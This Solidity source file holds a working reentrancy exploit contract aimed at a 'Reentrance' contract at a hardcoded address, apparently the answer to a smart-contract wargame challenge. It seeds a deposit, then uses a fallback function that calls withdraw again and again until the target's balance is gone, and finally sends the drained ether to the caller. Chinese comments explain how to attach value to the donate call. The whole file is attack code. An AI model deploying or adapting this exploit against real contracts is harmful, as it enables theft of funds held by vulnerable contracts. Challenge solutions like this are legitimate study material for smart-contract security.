// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'bachang/Reentrance.sol';

contract Attack{

    Reentrance reen = Reentrance(0x25e7a11334d3972D5EF22e05AD90A9b9E85ED04A);

    function begin1(address _to) public payable{//0.001 Ether  1 Finney
            //reen.donate(_to); 这么写错误 钱过不去
            reen.donate{value:msg.value}(_to);//要这么写 正确调用donate方法 带value  

    }


    function begin2() public {

        reen.withdraw(0.001*10**18);
    }

    fallback() payable external{
        uint256 bal=address(reen).balance;
        if(bal>0){
            begin2();
        }
    }

    function begin3() public {

        msg.sender.transfer(address(this).balance);
    }
}